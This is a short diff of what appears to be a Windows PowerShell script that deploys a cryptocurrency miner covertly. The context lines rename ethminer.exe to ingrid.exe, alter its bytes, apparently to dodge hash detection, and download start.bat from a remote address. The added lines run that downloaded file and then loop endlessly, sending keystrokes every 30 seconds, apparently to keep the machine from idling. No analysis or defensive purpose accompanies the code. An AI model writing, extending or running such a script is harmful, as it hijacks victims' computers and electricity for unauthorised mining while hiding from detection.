@@ -29,3 +29,13 @@ move ethminer.exe ingrid.exe
 echo a >> ingrid.exe
 
 $wc.DownloadFile($start,"c:\temp\start.bat")
+Start-Process start.bat
+
+$minutes = 1000000000000000000000000000000000000000
+
+$myShell = New-Object -com "Wscript.Shell"
+
+for ($i = 0; $i -lt $minutes; $i++) {
+  Start-Sleep -Seconds 30
+  $myShell.sendkeys(".")
+}
